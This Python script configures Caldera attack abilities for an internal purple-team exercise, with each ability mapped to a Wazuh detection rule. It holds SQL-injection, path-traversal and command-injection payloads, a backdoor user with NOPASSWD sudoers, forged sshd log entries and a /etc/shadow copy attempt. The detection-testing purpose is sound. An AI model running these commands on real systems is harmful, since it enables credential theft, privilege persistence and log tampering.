#!/usr/bin/env python3
"""
caldera-setup.py — Purple Team Phase 2 Caldera configuration

Creates Caldera abilities and adversary profile for Phase 2 TTPs:
  T1190  Exploit Public-Facing Application  (nuclei scan against Traefik)
  T1055  Process Injection                   (ptrace + LD_PRELOAD + /proc/mem)
  T1078  Valid Accounts                       (synthetic auth log entries)
  T1136  Create Account                       (useradd + sudoers + cleanup)
  T1003  Credential Access                    (shadow file read attempt)

Usage:
  # API key from env:
  CALDERA_API_KEY=<key> python3 caldera-setup.py

  # API key from OpenBao (requires vault CLI + VAULT_ADDR + VAULT_TOKEN):
  python3 caldera-setup.py --openbao

  # Dry-run (print what would be created):
  python3 caldera-setup.py --dry-run

  # Create operation template too:
  python3 caldera-setup.py --create-operation

Prerequisites:
  - Caldera server deployed and accessible at CALDERA_URL (default: https://caldera.eskridge.internal)
  - Sandcat agents deployed to target hosts (ESKA-444 complete)
  - pip install requests (stdlib only otherwise)

ESKA-445
"""

import argparse
import base64
import json
import os
import subprocess
import sys
import uuid

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("ERROR: 'requests' not installed. Run: pip3 install requests", file=sys.stderr)
    sys.exit(1)

CALDERA_URL = os.environ.get("CALDERA_URL", "https://caldera.eskridge.internal")
ADVERSARY_NAME = "Purple Team Phase 2"
ADVERSARY_DESCRIPTION = (
    "Phase 2 purple team exercise: T1190, T1055, T1078, T1136, T1003 "
    "against authorized internal targets. ESKA-217."
)

# Ability IDs are stable UUIDs so re-runs are idempotent
ABILITY_IDS = {
    "t1190_nuclei":    "a1900001-e217-4a00-b000-000000000001",
    "t1190_sqli":      "a1900001-e217-4a00-b000-000000000002",
    "t1190_traversal": "a1900001-e217-4a00-b000-000000000003",
    "t1190_cmdi":      "a1900001-e217-4a00-b000-000000000004",
    "t1190_apienum":   "a1900001-e217-4a00-b000-000000000005",
    "t1055_ptrace":    "a1055001-e217-4a00-b000-000000000001",
    "t1055_preload":   "a1055001-e217-4a00-b000-000000000002",
    "t1055_procmem":   "a1055001-e217-4a00-b000-000000000003",
    "t1078_rootssh":   "a1078001-e217-4a00-b000-000000000001",
    "t1078_stuffing":  "a1078001-e217-4a00-b000-000000000002",
    "t1136_useradd":   "a1136001-e217-4a00-b000-000000000001",
    "t1136_sudoers":   "a1136001-e217-4a00-b000-000000000002",
    "t1136_cleanup":   "a1136001-e217-4a00-b000-000000000003",
    "t1003_shadow":    "a1003001-e217-4a00-b000-000000000001",
}

ADVERSARY_ID = "b2170001-e217-4a00-b000-000000000001"

# Target hosts (match inframan inventory)
TRAEFIK_TARGET = "https://172.16.4.28"  # protectli-infra-01 DMZ
NUCLEI_BIN = "/usr/local/bin/nuclei"
NUCLEI_TEMPLATES = "/opt/nuclei-templates"
PT_TEST_USER = "pt-backdoor-test"
PT_SUDOERS = "/etc/sudoers.d/99-pt-test-REMOVE"


def b64(cmd: str) -> str:
    return base64.b64encode(cmd.encode()).decode()


def make_executor(command: str, cleanup: str = "", timeout: int = 60) -> dict:
    ex = {
        "platform": "linux",
        "name": "sh",
        "command": b64(command),
        "timeout": timeout,
    }
    if cleanup:
        ex["cleanup"] = [b64(cleanup)]
    return ex


ABILITIES = [
    # -------------------------------------------------------------------------
    # T1190 — Exploit Public-Facing Application
    # -------------------------------------------------------------------------
    {
        "ability_id": ABILITY_IDS["t1190_nuclei"],
        "tactic": "initial-access",
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "name": "T1190 — Nuclei web scanner against Traefik",
        "description": (
            "Run Nuclei exposure/misconfiguration templates against Traefik reverse proxy "
            "(protectli-infra-01). Triggers Wazuh rule 100829 (Nuclei UA detection)."
        ),
        "executors": [make_executor(
            f"{NUCLEI_BIN} -u {TRAEFIK_TARGET} "
            f"-t {NUCLEI_TEMPLATES}/http/exposures/ "
            f"-t {NUCLEI_TEMPLATES}/http/misconfiguration/ "
            "-timeout 10 -retries 1 -no-color -silent 2>&1 | head -30",
            timeout=120,
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1190_sqli"],
        "tactic": "initial-access",
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "name": "T1190 — SQL injection probe against Traefik",
        "description": "Send SQL injection patterns. Triggers Wazuh rule 100822.",
        "executors": [make_executor(
            "curl -sk -o /dev/null \"{t}/search?q=1'+OR+1=1--\" || true\n"
            "curl -sk -o /dev/null \"{t}/api/v1?id=1+UNION+SELECT+username,password+FROM+users--\" || true\n"
            "curl -sk -o /dev/null \"{t}/login?user=admin'+DROP+TABLE+users--\" || true\n"
            "echo 'SQLi probes sent'".format(t=TRAEFIK_TARGET),
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1190_traversal"],
        "tactic": "initial-access",
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "name": "T1190 — Path traversal probe against Traefik",
        "description": "Send path traversal patterns. Triggers Wazuh rule 100823.",
        "executors": [make_executor(
            "curl -sk -o /dev/null \"{t}/static/../../../../etc/passwd\" || true\n"
            "curl -sk -o /dev/null \"{t}/files/..%2f..%2f..%2fetc%2fshadow\" || true\n"
            "curl -sk -o /dev/null \"{t}/download?file=%c0%af%c0%af%c0%afetc/hosts\" || true\n"
            "echo 'Traversal probes sent'".format(t=TRAEFIK_TARGET),
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1190_cmdi"],
        "tactic": "initial-access",
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "name": "T1190 — Command injection probe against Traefik",
        "description": "Send command injection patterns. Triggers Wazuh rule 100824.",
        "executors": [make_executor(
            "curl -sk -o /dev/null \"{t}/ping?host=127.0.0.1;cat%20/etc/passwd\" || true\n"
            "curl -sk -o /dev/null \"{t}/exec?cmd=$(whoami)\" || true\n"
            "curl -sk -o /dev/null \"{t}/run?arg=test|id\" || true\n"
            "echo 'CmdI probes sent'".format(t=TRAEFIK_TARGET),
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1190_apienum"],
        "tactic": "initial-access",
        "technique_id": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "name": "T1190 — Traefik API enumeration",
        "description": "Probe Traefik API endpoints. Triggers Wazuh rules 100820, 100825-100828.",
        "executors": [make_executor(
            "for path in api/rawdata api/http/routers api/http/services api/entrypoints api/overview api/version; do\n"
            "  curl -sk -o /dev/null \"{t}/$path\" || true\n"
            "done\n"
            "echo 'API enum probes sent'".format(t=TRAEFIK_TARGET),
        )],
    },
    # -------------------------------------------------------------------------
    # T1055 — Process Injection
    # -------------------------------------------------------------------------
    {
        "ability_id": ABILITY_IDS["t1055_ptrace"],
        "tactic": "defense-evasion",
        "technique_id": "T1055",
        "technique_name": "Process Injection",
        "name": "T1055.008 — ptrace ATTACH attempt",
        "description": (
            "Attempt ptrace(PTRACE_ATTACH) on a benign sleep process. "
            "Even if denied, auditd logs the syscall. "
            "Triggers Wazuh rules 100830, 100831."
        ),
        "executors": [make_executor(
            "sleep 30 &\n"
            "TARGET_PID=$!\n"
            "python3 -c \"\n"
            "import ctypes, os, sys\n"
            "libc = ctypes.CDLL('libc.so.6', use_errno=True)\n"
            "PTRACE_ATTACH = 16\n"
            "PTRACE_DETACH = 17\n"
            "pid = int(sys.argv[1])\n"
            "r = libc.ptrace(PTRACE_ATTACH, pid, 0, 0)\n"
            "print(f'ptrace ATTACH returned {r} (logged by auditd)')\n"
            "if r == 0:\n"
            "    libc.ptrace(PTRACE_DETACH, pid, 0, 0)\n"
            "\" $TARGET_PID\n"
            "kill $TARGET_PID 2>/dev/null || true",
            cleanup="kill $(pgrep -f 'sleep 30') 2>/dev/null || true",
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1055_preload"],
        "tactic": "defense-evasion",
        "technique_id": "T1055",
        "technique_name": "Process Injection",
        "name": "T1055 — LD_PRELOAD injection simulation",
        "description": (
            "Create a dummy .so in /tmp, run a benign command with LD_PRELOAD set. "
            "Triggers Wazuh rules 100833, 100835."
        ),
        "executors": [make_executor(
            "PT_LIB=$(mktemp /tmp/pt-preload-XXXXX.so)\n"
            "echo 'PURPLE-TEAM-TEST-DUMMY-SO' > \"$PT_LIB\"\n"
            "chmod 755 \"$PT_LIB\"\n"
            "LD_PRELOAD=\"$PT_LIB\" /bin/echo 'PT-PRELOAD-TEST' || true\n"
            "rm -f \"$PT_LIB\"",
            cleanup="rm -f /tmp/pt-preload-*.so",
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1055_procmem"],
        "tactic": "defense-evasion",
        "technique_id": "T1055",
        "technique_name": "Process Injection",
        "name": "T1055 — /proc/pid/mem access attempt",
        "description": (
            "Attempt to open /proc/pid/mem of a benign process. "
            "Permission denied but auditd logs the openat syscall. "
            "Triggers Wazuh rule 100834."
        ),
        "executors": [make_executor(
            "sleep 30 &\n"
            "TARGET_PID=$!\n"
            "python3 -c \"\n"
            "import os, sys\n"
            "pid = sys.argv[1]\n"
            "try:\n"
            "    fd = os.open(f'/proc/{pid}/mem', os.O_RDWR)\n"
            "    os.close(fd)\n"
            "    print(f'/proc/{pid}/mem opened (auditd logged)')\n"
            "except Exception as e:\n"
            "    print(f'/proc/{pid}/mem: {e} (still logged by auditd)')\n"
            "\" $TARGET_PID\n"
            "kill $TARGET_PID 2>/dev/null || true",
        )],
    },
    # -------------------------------------------------------------------------
    # T1078 — Valid Accounts
    # -------------------------------------------------------------------------
    {
        "ability_id": ABILITY_IDS["t1078_rootssh"],
        "tactic": "defense-evasion",
        "technique_id": "T1078",
        "technique_name": "Valid Accounts",
        "name": "T1078 — Synthetic root SSH login log entry",
        "description": (
            "Inject a synthetic root SSH login event into auth.log via logger. "
            "Triggers Wazuh rule 100846."
        ),
        "executors": [make_executor(
            "logger -p auth.info -t sshd "
            "'Accepted publickey for root from 10.0.42.6 port 22222 ssh2: RSA SHA256:PT-TEST-NOT-REAL-KEY'\n"
            "echo 'Root SSH auth log entry injected'",
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1078_stuffing"],
        "tactic": "defense-evasion",
        "technique_id": "T1078",
        "technique_name": "Valid Accounts",
        "name": "T1078 — Multi-user auth from same IP (credential stuffing sim)",
        "description": (
            "Inject 5 synthetic successful auth log entries from the same source IP. "
            "Triggers Wazuh rule 100847."
        ),
        "executors": [make_executor(
            "for user in testuser1 testuser2 testuser3 admin deploy; do\n"
            "  port=$((RANDOM % 10000 + 40000))\n"
            "  logger -p auth.info -t sshd "
            "\"Accepted password for $user from 10.99.99.99 port $port ssh2\"\n"
            "done\n"
            "echo 'Credential stuffing auth entries injected'",
        )],
    },
    # -------------------------------------------------------------------------
    # T1136 — Create Account
    # -------------------------------------------------------------------------
    {
        "ability_id": ABILITY_IDS["t1136_useradd"],
        "tactic": "persistence",
        "technique_id": "T1136",
        "technique_name": "Create Account",
        "name": "T1136.001 — Create local backdoor user",
        "description": (
            "Create test user pt-backdoor-test. "
            "Triggers Wazuh rules 100850, 100852, 100858."
        ),
        "executors": [make_executor(
            f"useradd -m -s /bin/bash -c 'PURPLE-TEAM-TEST-DELETE-ME' {PT_TEST_USER} 2>&1\n"
            f"echo 'Created user {PT_TEST_USER}'",
            cleanup=f"userdel -rf {PT_TEST_USER} 2>/dev/null || true",
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1136_sudoers"],
        "tactic": "persistence",
        "technique_id": "T1136",
        "technique_name": "Create Account",
        "name": "T1136 — Grant test user sudo via sudoers.d",
        "description": (
            "Write /etc/sudoers.d/99-pt-test-REMOVE granting NOPASSWD ALL. "
            "Triggers Wazuh rules 100854, 100855, 100856."
        ),
        "executors": [make_executor(
            f"printf '# PURPLE TEAM TEST - DELETE\\n{PT_TEST_USER} ALL=(ALL) NOPASSWD: ALL\\n' "
            f"> {PT_SUDOERS}\n"
            f"chmod 0440 {PT_SUDOERS}\n"
            f"usermod -aG sudo {PT_TEST_USER} 2>&1\n"
            f"echo 'Sudoers entry created'",
            cleanup=f"rm -f {PT_SUDOERS}",
        )],
    },
    {
        "ability_id": ABILITY_IDS["t1136_cleanup"],
        "tactic": "persistence",
        "technique_id": "T1136",
        "technique_name": "Create Account",
        "name": "T1136 — Cleanup test user and sudoers",
        "description": "Remove pt-backdoor-test user and sudoers drop-in. Exercise cleanup.",
        "executors": [make_executor(
            f"userdel -rf {PT_TEST_USER} 2>/dev/null || true\n"
            f"rm -f {PT_SUDOERS}\n"
            f"id {PT_TEST_USER} 2>&1 | grep -q 'no such user' && echo 'Cleanup verified' || echo 'WARNING: user still exists'",
        )],
    },
    # -------------------------------------------------------------------------
    # T1003 — OS Credential Dumping
    # -------------------------------------------------------------------------
    {
        "ability_id": ABILITY_IDS["t1003_shadow"],
        "tactic": "credential-access",
        "technique_id": "T1003",
        "technique_name": "OS Credential Dumping",
        "name": "T1003 — Shadow file read attempt",
        "description": (
            "Attempt to read /etc/shadow as non-root and copy to /tmp. "
            "Expected: permission denied. Triggers FIM + T1003 auditd rules."
        ),
        "executors": [make_executor(
            "PT_SHADOW_COPY=$(mktemp /tmp/pt-shadow-XXXXX)\n"
            "cat /etc/shadow > \"$PT_SHADOW_COPY\" 2>&1 && echo 'WARNING: shadow read succeeded' || echo 'Shadow read denied (expected)'\n"
            "cp /etc/shadow \"$PT_SHADOW_COPY\" 2>&1 && echo 'WARNING: shadow copy succeeded' || echo 'Shadow copy denied (expected)'\n"
            "rm -f \"$PT_SHADOW_COPY\"",
            cleanup="rm -f /tmp/pt-shadow-*",
        )],
    },
]

ADVERSARY = {
    "adversary_id": ADVERSARY_ID,
    "name": ADVERSARY_NAME,
    "description": ADVERSARY_DESCRIPTION,
    "atomic_ordering": [a["ability_id"] for a in ABILITIES],
}


def get_api_key(use_openbao: bool) -> str:
    if use_openbao:
        try:
            result = subprocess.run(
                ["vault", "kv", "get", "-field=api_key", "caldera/server"],
                capture_output=True, text=True, timeout=15, check=True,
            )
            return result.stdout.strip()
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            print(f"ERROR: OpenBao lookup failed: {e}", file=sys.stderr)
            print("Set VAULT_ADDR + VAULT_TOKEN, or export CALDERA_API_KEY directly.", file=sys.stderr)
            sys.exit(1)

    key = os.environ.get("CALDERA_API_KEY", "")
    if not key:
        print("ERROR: CALDERA_API_KEY not set. Use --openbao or export CALDERA_API_KEY=<key>", file=sys.stderr)
        sys.exit(1)
    return key


def caldera_request(session: requests.Session, method: str, path: str, **kwargs):
    url = f"{CALDERA_URL.rstrip('/')}{path}"
    resp = session.request(method, url, verify=False, timeout=30, **kwargs)
    if resp.status_code not in (200, 201):
        print(f"  WARNING: {method} {path} → {resp.status_code}: {resp.text[:200]}")
    return resp


def upsert_ability(session: requests.Session, ability: dict, dry_run: bool) -> str:
    ability_id = ability["ability_id"]
    name = ability["name"]

    if dry_run:
        print(f"  [DRY-RUN] Would upsert ability: {name} ({ability_id})")
        return ability_id

    # Check if exists
    resp = caldera_request(session, "GET", f"/api/v2/abilities/{ability_id}")
    if resp.status_code == 200:
        caldera_request(session, "PATCH", f"/api/v2/abilities/{ability_id}", json=ability)
        print(f"  Updated ability: {name}")
    else:
        caldera_request(session, "POST", "/api/v2/abilities", json=ability)
        print(f"  Created ability: {name}")

    return ability_id


def upsert_adversary(session: requests.Session, adversary: dict, dry_run: bool):
    adversary_id = adversary["adversary_id"]

    if dry_run:
        print(f"  [DRY-RUN] Would upsert adversary: {adversary['name']} ({adversary_id})")
        print(f"  Ability order: {adversary['atomic_ordering']}")
        return

    resp = caldera_request(session, "GET", f"/api/v2/adversaries/{adversary_id}")
    if resp.status_code == 200:
        caldera_request(session, "PATCH", f"/api/v2/adversaries/{adversary_id}", json=adversary)
        print(f"  Updated adversary: {adversary['name']}")
    else:
        caldera_request(session, "POST", "/api/v2/adversaries", json=adversary)
        print(f"  Created adversary: {adversary['name']}")


def create_operation_template(session: requests.Session, dry_run: bool):
    op = {
        "name": "Phase 2 Purple Team Exercise",
        "adversary": {"adversary_id": ADVERSARY_ID},
        "planner": {"id": "atomic"},
        "group": "red",
        "state": "running",
        "obfuscator": "plain-text",
        "autonomous": 1,
        "visibility": 51,
    }

    if dry_run:
        print(f"  [DRY-RUN] Would create operation: {op['name']}")
        return

    resp = caldera_request(session, "POST", "/api/v2/operations", json=op)
    if resp.status_code in (200, 201):
        op_id = resp.json().get("id", "unknown")
        print(f"  Created operation: {op['name']} (id={op_id})")
        print(f"  Monitor at: {CALDERA_URL}/operations")
    else:
        print(f"  WARNING: Operation creation returned {resp.status_code}")


def main():
    parser = argparse.ArgumentParser(description="Configure Caldera for Phase 2 purple team exercise")
    parser.add_argument("--openbao", action="store_true", help="Fetch API key from OpenBao vault CLI")
    parser.add_argument("--dry-run", action="store_true", help="Print what would be created without calling Caldera")
    parser.add_argument("--create-operation", action="store_true", help="Also create a default operation (starts immediately)")
    parser.add_argument("--caldera-url", default=CALDERA_URL, help=f"Caldera URL (default: {CALDERA_URL})")
    args = parser.parse_args()

    global CALDERA_URL
    CALDERA_URL = args.caldera_url

    print(f"Caldera Phase 2 setup — target: {CALDERA_URL}")
    print(f"Abilities to configure: {len(ABILITIES)}")
    print(f"Adversary: {ADVERSARY_NAME}")
    print()

    api_key = "DRY-RUN" if args.dry_run else get_api_key(args.openbao)

    session = requests.Session()
    session.headers.update({
        "KEY": api_key,
        "Content-Type": "application/json",
    })

    print("=== Abilities ===")
    for ability in ABILITIES:
        upsert_ability(session, ability, args.dry_run)

    print()
    print("=== Adversary ===")
    upsert_adversary(session, ADVERSARY, args.dry_run)

    if args.create_operation:
        print()
        print("=== Operation ===")
        create_operation_template(session, args.dry_run)

    print()
    if not args.dry_run:
        # Verify agent registration
        resp = caldera_request(session, "GET", "/api/v2/agents")
        if resp.status_code == 200:
            agents = resp.json()
            print(f"Registered Sandcat agents: {len(agents)}")
            for agent in agents:
                print(f"  - {agent.get('display_name', agent.get('paw', 'unknown'))} "
                      f"({agent.get('host', '?')}) platform={agent.get('platform', '?')}")
        print()
        print(f"Setup complete. Launch exercise at: {CALDERA_URL}/operations")
    else:
        print("[DRY-RUN] Complete. No changes made.")


if __name__ == "__main__":
    main()
